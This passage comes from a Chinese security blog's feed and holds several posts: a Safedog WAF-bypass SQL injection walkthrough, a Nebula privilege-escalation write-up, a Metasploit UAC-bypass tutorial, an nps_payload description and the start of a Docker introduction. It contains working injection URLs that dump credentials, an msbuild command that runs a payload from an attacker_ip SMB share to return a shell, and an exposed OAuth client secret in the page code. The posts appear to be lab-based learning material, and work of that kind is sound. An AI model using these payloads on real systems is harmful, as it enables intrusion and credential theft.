版本</div><div class="line">2. user()——数据库用户名</div><div class="line">3. database()——数据库名</div><div class="line">4. @@datadir——数据库路径</div><div class="line">5. @@version_compile_os——操作系统版本</div></pre></td></tr></table></figure></p><p>既然已经知道了拦截什么，那么绕他还难么，掏出/**/注释大法。<br>在user(),database()之间处理以下。<br>那么就成为了<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">user/**/(/**/)</div><div class="line">database/**/(/**/)</div><div class="line">完整url：http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user/**/(/**/),database/**/(/**/))/*--*/*/-- -</div></pre></td></tr></table></figure></p><p><img src="/img/safedog_bypass_8.jpg" alt="image"><br>正常爆出数据库跟当前用户</p><h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p>发现我本身的狗可能有点问题，他不拦截from，于是也没有绕，还是那句话，需要啥，绕啥。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,table_name)),user/**/(/**/)</div><div class="line">from information_schema.tables where table_schema=&apos;security&apos;)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure></p><p><img src="/img/safedog_bypass_9.jpg" alt="image"><br><strong>得到table</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">emails</div><div class="line">referers</div><div class="line">uagents</div><div class="line">users</div></pre></td></tr></table></figure></p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,column_name)),user/**/(/**/)</div><div class="line">from information_schema.columns where table_name=&apos;users&apos;)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure><p><img src="/img/safedog_bypass_10.jpg" alt="image"><br><strong>得到column</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">id</div><div class="line">username</div><div class="line">password</div></pre></td></tr></table></figure></p><h2 id="读内容"><a href="#读内容" class="headerlink" title="读内容"></a>读内容</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,username,password)),user/**/(/**/)</div><div class="line">from users)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure><p><img src="/img/safedog_bypass_11.jpg" alt="image"><br><strong>dump</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Dumb#Dumb</div></pre></td></tr></table></figure></p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/img/safedog_bypass_1.jpg&quot; alt=&quot;image&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="bypass" scheme="http://yoursite.com/categories/bypass/"/>
    
    
      <category term="bypass" scheme="http://yoursite.com/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Exploit-Exercises--00&amp;01笔记</title>
    <link href="http://yoursite.com/exploit-exercises00-01.html"/>
    <id>http://yoursite.com/exploit-exercises00-01.html</id>
    <published>2017-08-14T22:48:36.000Z</published>
    <updated>2017-09-12T13:55:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/9D4B759184B93667C22C7C841543866D.png" alt="enter description here"><br><a id="more"></a><br>   决定和你们分享一下，这个东西真的好玩 ！刺激！！给力！！！<br><a href="https://exploit-exercises.com/" target="_blank" rel="external">https://exploit-exercises.com/</a><br>exploit-exercises.com提供了各种虚拟机，文档和挑战，可用于了解各种计算机安全问题，例如特权升级，漏洞分析，漏洞开发，调试，逆向工程和一般网络安全问题。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502722644808.jpg" alt="enter description here"><br>&nbsp;<br>那么我们就现在来一盘紧张又刺激的漏洞利用练习吧</p><h2 id="1-下载Nebula"><a href="#1-下载Nebula" class="headerlink" title="1.下载Nebula"></a>1.下载Nebula</h2><p>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502722759188.jpg" alt="enter description here"><br>&nbsp;<br>点击下载  =&gt; <a href="https://drive.google.com/drive/folders/0B9RbZkKdRR8qLWZBcVBvanlLb1U" target="_blank" rel="external">https://drive.google.com/drive/folders/0B9RbZkKdRR8qLWZBcVBvanlLb1U</a><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502722799436.jpg" alt="enter description here"><br>&nbsp;</p><ol><li>登录使用。下载完以后呢和我使用的界面是一样的<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502722954976.jpg" alt="enter description here"><br>&nbsp;</li></ol><h2 id="3-level00"><a href="#3-level00" class="headerlink" title="3. level00"></a>3. level00</h2><p>关于<br>此级别要求您找到将作为“flag00”帐户运行的设置用户ID程序。您还可以通过仔细查看/可疑目录中的顶级目录来找到此信息。<br>要访问此级别，请使用level00的密码登录为level00。<br>进来以后我们看到用户id是level00<br><img src="http://ojg8j426f.bkt.clouddn.com/1502723067209.jpg" alt="enter description here"><br>&nbsp;<br>那么我找了找在home目录中发现有很多文件夹 分别查看了使用权限。可以看到level00和flag00 这两个文件夹只有属于level00这个用户级别的 。其他的文件夹属于其他的用户的级别。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502723257201.jpg" alt="enter description here"><br>&nbsp;<br>其实到了这里，个人的思路也就断了 ，不得已从网上找了一份答案 做了一个参考<br>这位作者呢通过用户名和用户组去搜索命令,于是跟着他的思路走着，找到了第一条flag<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502723537152.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502723697755.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502723682632.jpg" alt="enter description here"><br>&nbsp;<br>越权成功<br><img src="http://ojg8j426f.bkt.clouddn.com/1502723847331.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502723912161.jpg" alt="enter description here"><br><a href="http://www.cnblogs.com/zealoct/p/3511762.html" target="_blank" rel="external">http://www.cnblogs.com/zealoct/p/3511762.html</a></p><h2 id="4-level01"><a href="#4-level01" class="headerlink" title="4. level01"></a>4. level01</h2><p>在下面的程序中有一个漏洞，允许任意程序被执行，你能找到吗？<br>无奈我还是做了弊，看了视频才知道是怎么回事！<br><a href="https://www.youtube.com/watch?v=-mtOlyxyJx4" target="_blank" rel="external">https://www.youtube.com/watch?v=-mtOlyxyJx4</a><br>要做这个级别，请使用密码level01作为level01帐户登录 。该级别的文件可以在/ home/flag01中找到。</p><p><img src="http://ojg8j426f.bkt.clouddn.com/1502728157477.jpg" alt="enter description here"></p><p>&nbsp;<br>进入level01这个账户后根据提示在/ home/flag01，发现有flag01这个文件 ，我尝试的执行这个文件 得到了 and now what?输出<br><img src="http://ojg8j426f.bkt.clouddn.com/1502724658968.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502724739752.jpg" alt="enter description here"><br>&nbsp;<br>根据源代码可以看到<br>setresuid（）设置调用进程的真实用户ID，有效用户ID和保存的set-user-ID。<br>非特权用户进程可以将真实的UID，有效的UID和保存的set-user-ID，各自改为以下之一：当前的真实UID，当前有效UID或当前保存的set-user-ID。<br>特权进程（在Linux上，具有CAP_SETUID功能的进程）可以将真正的UID，有效的UID和保存的set-user-ID设置为任意值。<br>setresgid（）设置真正的GID，有效的GID和保存的调用进程的set-group-ID（并且始终将文件系统GID修改为与有效GID相同），对非特权进程具有相同的限制。</p><p>关键点还是在/usr/bin/env  ，源代码中使用system 调用系统命令 ，使用env 这个命令，去输出 and now what?这个字符串<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502725094137.jpg" alt="enter description here"><br>&nbsp;<br>Linux系统里的env命令  可以显示当前用户的环境变量，还可以用来在指定环境变量下执行其他命令。下面来比较一下set，env和export命令的异同：set命令显示当前shell的变量，包括当前用户的变量;env命令显示当前用户的变量;export命令显示当前导出成用户变量的shell变量。每个shell有自己特有的变量（set）显示的变量，这个和用户变量是不同的，当前用户变量和你用什么shell无关，不管你用什么shell都在，比如HOME，SHELL等这些变量，但shell自己的变量不同shell是不同的，比如BASH_ARGC，BASH等，这些变量只有set才会显示，是bash特有的，export不加参数的时候，显示哪些变量被导出成了用户变量，因为一个shell自己的变量可以通过export “导出”变成一个用户变量。</p><p>  可以看到 在PATH 中环境变量中有带s的，意思就是spuer了，在视频中大牛进行了用户环境变量（包括源代码中 也是使用env 中 去输出字符串）<br>进行特定的权限赋予。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502725817587.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502725890574.jpg" alt="enter description here"><br>可以对比 对用户变量的前后改变<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502725863568.jpg" alt="enter description here"><br>&nbsp;<br>当我再次运行的时候发现是失败的，原因是出在那呢<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502726363846.jpg" alt="enter description here"><br>&nbsp;<br>这意味着我们可以提供我们自己的echo，修改路径，以便这个echo被调用优先于内置，然后我们可以运行任意命令。<br>当然是少了echo 这个文件<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502726983220.jpg" alt="enter description here"><br>&nbsp;<br>越权成功，得到了flag<br><img src="http://ojg8j426f.bkt.clouddn.com/1502727689578.jpg" alt="enter description here"></p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/9D4B759184B93667C22C7C841543866D.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Bypassuac_Comhijack ---kali linux</title>
    <link href="http://yoursite.com/bypassuac-comhijack.html"/>
    <id>http://yoursite.com/bypassuac-comhijack.html</id>
    <published>2017-08-11T15:24:43.000Z</published>
    <updated>2017-09-11T16:43:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/2ADD67C458C4CF66997F4D366E247747.png" alt="enter description here"><br><a id="more"></a><br> 前天看了一个国外大牛的视频，觉得很有意思。就决定和你们分享一下<br> <a href="https://www.youtube.com/watch?v=HNRrmfuTRCY" target="_blank" rel="external">https://www.youtube.com/watch?v=HNRrmfuTRCY</a><br> <a href="https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/" target="_blank" rel="external">https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/</a></p><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>简称  用户帐户控制，  UAC  是Windows Vista中引入了通过防止程序的管理权限，除非批准的用户提供额外的安全功能。以下是用户在尝试运行程序或访问需要许可的Windows的一部分时可能看到的UAC确认对话框的图片。</p><p> Metasploit模块<br> <a href="https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb" target="_blank" rel="external">https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb</a><br> <img src="http://ojg8j426f.bkt.clouddn.com/1502454208280.jpg" alt="enter description here"></p><p> 该模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些高完整性流程时，将引用这些注册表项，从而导致加载用户控制的DLL的进程。这些DLL包含导致高级会话的有效载荷。有效负载调用后清除注册表项的修改。该模块需要有效负载的架构来匹配操作系统，但目前的低权限Meterpreter会话架构可能不同。如果在单独的进程中启动有效负载后指定EXE :: Custom，您的DLL应该调用ExitProcess（）。该模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，则此模块将无法正常运行。</p><p> （以上引用大神文章）</p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/bypassuac_comhijack.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p> 1.下载bypassuac_comhijack.rb<br> <pre><br> curl -o bypassuac_comhijack.rb <a href="https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb" target="_blank" rel="external">https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb</a><br> </pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502438764029.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>2.将下载的bypassuac_comhijack.rb 剪贴到msf 中<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502438764029.jpg" alt="enter description here"><br>&nbsp;</p><ol><li>需要的到一个Meterprerter的会话</li></ol><p>比如我这里使用我个人的脚本,第三个得到Meterprerter的会话。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454345346.jpg" alt="enter description here"><br>&nbsp;</p><p><img src="http://ojg8j426f.bkt.clouddn.com/1502454478100.jpg" alt="enter description here"><br>&nbsp;</p><p>3.使用bypassuac_comhijack<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454553056.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454631936.jpg" alt="enter description here"><br>&nbsp;<br>看到需要设置的是会话序列号，我这里设置 session 为 1，并且执行payload的时候，会报错，让我们看看需要更改的地方？<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454757164.jpg" alt="enter description here"><br>&nbsp;<br>因为目标虚拟机win10镜像本身是x64架构的，所以我们这里需要更改payload<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454854556.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454868195.jpg" alt="enter description here"><br>&nbsp;<br>并且更改端口<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454885362.jpg" alt="enter description here"><br>&nbsp;<br>（PS:如果目标机是32位的话，不用更改PAYLOAD 只需更改端口即可）</p><p>4.得到session 2<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502455024735.jpg" alt="enter description here"><br>&nbsp;<br>这里可以看到 我getuid的时候 是demon 用户<br>当我getsystem的时候 ，得到了system权限。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502455140138.jpg" alt="enter description here"></p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/2ADD67C458C4CF66997F4D366E247747.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="http://yoursite.com/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Nop-Payload</title>
    <link href="http://yoursite.com/nop-payload.html"/>
    <id>http://yoursite.com/nop-payload.html</id>
    <published>2017-07-30T20:12:35.000Z</published>
    <updated>2017-09-12T13:55:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/B47A30EF9D6D80AB3A6721846F343D42.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/nop-payload.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>新工具发布：NPS_Payload</p><p>在过去一年中，我们看到了大量的研究成果，其中强调了Microsoft的本机二进制文件，这些二进制文件可以被攻击者利用来妥协或获取系统访问权限。这些二进制文件之一msbuild.exe已被证明是非常可靠的，允许我们在后处理场景中在主机上获取shell。</p><p>Casey Smith（@subtee）撰写了几篇关于如何使用msbuild.exe从.csproj或.xml文件执行代码的文章。Casey发现有几个部分允许有人添加任何想要的代码，当msbuild.exe分析文件时，它将执行这些代码块。这允许一个人将任何C＃代码添加到csproj或xml文件中。</p><p>两个TrustedSec团队成员Larry Spohn和Ben Mauch决定将Ben的“不PowerShell”（NPS）和Dave Kennedy的独角兽和Casey的示例一起进行了一些功能的混合，并提出了一个新的工具称为nps_payload。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/nps_payload_1.png" alt="enter description here"><br>&nbsp;<br>此工具提供了一种生成将被插入到msbuild_nps.xml文件中的PowerShell有效负载的方法，并且当msbuild.exe运行文件时将使用nps来执行有效负载。类似于Dave Kennedy的独角兽，nps_payload还提供了一个Metasploit控制台资源（msbuild_nps.rc）文件。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/nps_payload_2.png" alt="enter description here"><br>&nbsp;<br>有两种方法可以部署msbuild_nps.xml文件。第一个是将msbuild_nps.xml文件复制到远程主机，然后使用以下命令执行。</p><p>C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe C：\ <path_to_msbuild_nps.xml></path_to_msbuild_nps.xml></p><p>第二种方法是在SMB共享上托管msbuild_nps.xml文件，并使用UNC路径与msbuild.exe命令指向xml文件。</p><p>C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe \ <attacker_ip> \ <share> \ msbuild_nps.xml</share></attacker_ip></p><p>这将使用nps运行编码的PowerShell有效载荷，并将返回一个shell到攻击者。一旦攻击者迁移到新进程，msbuild.exe将退出。重要的是要注意，nps执行PowerShell代码而不调用powershell.exe，不会显示在事件ID 4688（新建进程）中。</p><p>对于Defenders，您可以通过监视任何调用msbuild.exe的事件ID 4688事件来检测此攻击，然后检查任何对UNC或本地文件的引用的命令行参数。您还可以启用PowerShell日志记录并监视事件ID 4104事件，并查找已编码的任何PowerShell代码。</p><p>github :www.github.com/trustedsec/nps_payload<br><a href="https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/" target="_blank" rel="external">https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/</a></p><h2 id="安装部分"><a href="#安装部分" class="headerlink" title="安装部分"></a>安装部分</h2><p><pre><br>pip install -r requirements.txt<br>apt-get install samba<br>vi / nano / whatever /etc/samba/smb.conf 3.）将以下内容添加到文件的底部（酌情更改）<br>[payloads$]<br>comment = Dirty Payloads<br>path = /opt/shares/payloads<br>browsable = yes<br>guest ok = yes<br>read only = yes</pre></p><p> service smbd restart<br> <br> 接下来 看视频如何操作演示的吧！！</p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/B47A30EF9D6D80AB3A6721846F343D42.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="http://yoursite.com/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>我的Docker不归路--重新认识docker</title>
    <link href="http://yoursite.com/%E6%88%91%E7%9A%84%E5%9B%9E%E5%BD%92docker.html"/>
    <id>http://yoursite.com/我的回归docker.html</id>
    <published>2017-07-29T21:26:41.000Z</published>
    <updated>2017-09-11T16:36:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/create-reusable-burner-os-with-docker-part-2-customizing-our-hacking-container.1280x600.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="我的Docker不归路——-回归之作"><a href="#我的Docker不归路——-回归之作" class="headerlink" title="我的Docker不归路——(回归之作)"></a>我的Docker不归路——(回归之作)</h2><p>&nbsp;</p><h2 id="0x01-docker-简介"><a href="#0x01-docker-简介" class="headerlink" title="0x01 docker 简介"></a>0x01 docker 简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>（这篇文章本是不打算公开的，写下这篇文章本是在四月份的，现在打算将其公开）前段时间写了一份Dcoker_kali，docker对我来说可以使用docker_kalil inux,也可以部署我们安全工作的靶机环境，如前段时间，在我的msf系列课程中就用到了，如何部署docker-s2-046的靶机环境。它对我来说应用不止这么一点，可以部署DVWA、WebGoat等渗透环境，可当做一个渗透演练平台。之前留了一部分坑在那，这次我打算好好的完善此Docker_kali使用内容。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491292493739.jpg" alt="enter description here"><br><img src="http://ojg8j426f.bkt.clouddn.com/202F1BA9-E832-467E-827D-A0084254460F.png" alt="enter description here"><br>&nbsp;<br><span style="color: #008000;">重新认识Docker </span><br>&nbsp;<br><strong><span style="color: #ffff99;"><br>&nbsp;&nbsp;Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的运行效率，降低了云计算资源供应的成本！ 使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！<br>无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，以在有限的时间内做更多有意义的事。</span></strong><br>&nbsp;<br>&nbsp;在安装前，先了解一些主要的概念<br>&nbsp;Docker 在Linux上安装过程里，你的物理机器既是本地主机也是Docker的宿主机。在网络里，本地主机的意思是你的计算机。Docker的宿主机是托管这容器运行的计算机。</p><p>&nbsp;在一个标准的Linux安装中，Docker客户端、Docker Daemon和一些运行中的容器会直接寄托在你的本地主机上。这意味着你可以使用标准的本地地址和端口去访问容器<br>为什么要使用 Docker？</p><p>&nbsp;作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。</p><p><strong><span style="color: #ffff99;">更高效的利用系统资源</span></strong></p><p>&nbsp;由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><p><strong><span style="color: #ffff99;">更快速的启动时间</span></strong></p><p>&nbsp;传统的虚拟机技术启动应用服务往往需要数分钟，而 Docker 容器应用，由于直接运行于宿主内核，无需启动完整的操作系统，因此可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。</p><p><strong><span style="color: #ffff99;">一致的运行环境</span></strong></p><p>&nbsp;开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 “这段代码在我机器上没问题啊” 这类问题。</p><p><strong><span style="color: #ffff99;">持续交付和部署</span></strong></p><p>&nbsp;对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。</p><p>&nbsp;使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery/Deployment) 系统进行自动部署。</p><p>&nbsp;而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像。</p><p><strong><span style="color: #ffff99;">更轻松的迁移</span></strong></p><p>&nbsp;由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，甚至是笔记本，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。</p><p><strong><span style="color: #ffff99;">更轻松的维护和扩展</span></strong></p><p>&nbsp;Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。<br>&nbsp;<br>&nbsp;<br>参考资料:<a href="https://yeasy.gitbooks.io/docker_practice/content/introduction/why.html" target="_blank" rel="external">https://yeasy.gitbooks.io/docker_practice/content/introduction/why.html</a><br>&nbsp;<br>&nbsp;</p><p><br></p><h2 id="0x02windows-下安装docker"><a href="#0x02windows-下安装docker" class="headerlink" title="0x02windows 下安装docker"></a>0x02windows 下安装docker</h2><p>&nbsp;<br><span style="color: #ffff99;">Docker for Windows的安装与使用</span><br>&nbsp;&nbsp;&nbsp;在Windows 10中，下载Docker for Windows的安装包，然后开始安装。正如上面所述，如果Hyper-V没有启用，安装过程会自动启用Hyper-V，这将需要重新启动Windows系统。安装完成后，就可以在Windows下使用Docker了。<br><strong><span style="color: #ffff99;">在安装docker for windows 之后 不能安装vm、vbox等虚拟机，如需安装vbox、vm等虚拟机可采用下一个docker tools box 安装方法。</span></strong><br>&nbsp;</p><p>&nbsp;启动Docker for Windows，会在系统托盘部分显示一条小鲸鱼的图标：<img src="http://ojg8j426f.bkt.clouddn.com/18AE48EA-DDC3-42A9-A3FB-EBF6DABAF159.png" alt="enter description here">。在Docker完全启动之前，小鲸鱼背上的小方块会不停地闪烁变化，等小方块稳定不变后，表示系统完全启动成功，此时就可以对Docker的环境进行设置，或者开始执行Docker命令了。<br>&nbsp;<br>&nbsp;<br>&nbsp;在Docker for Windows成功启动后，就可以在CMD下执行Docker命令了.<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/95A1080D-F7EC-49BA-8349-33E72A8CC427.png" alt="enter description here"><br>&nbsp;<br><span style="color: #ffff99;">Docker tools box的安装与使用</span></p><p>&nbsp;因为Docker Engine守护程序使用特定于Linux的内核功能，因此无法在Windows上本机运行Docker Engine。相反，你必须使用docker命令 docker-machine，创建并连接到一个小型的Linux VM您的计算机上。该VM在Windows系统上为您托管Docker Engine。</p><p>&nbsp;要运行Docker，您的计算机必须具有运行Windows 7或更高版本的64位操作系统。另外，您必须确保在您的计算机上启用虚拟化。<br><br></p><p>0x001<br><img src="http://ojg8j426f.bkt.clouddn.com/11FD3728-44E9-4E2D-9786-AE2D3ECBF77B.png" alt="enter description here"><br>&nbsp;<br><br></p><p>0x002<br>&nbsp;安装完会有VirtualBox/Docker Quickstart Terminal /kitematic (GUI图形化管理工具)<br>&nbsp;<br>&nbsp;&nbsp;<img src="http://ojg8j426f.bkt.clouddn.com/8D411BF4-40C8-4236-A585-478566FF0187.png" alt="enter description here"></p><p><br></p><p>0x003<br><span style="color: #ffff99;">启动Dcoker tools box 报错该解决？</span></p><p><img src="http://ojg8j426f.bkt.clouddn.com/521CBD40926DEA268F4EEE8005297408.jpg" alt="enter description 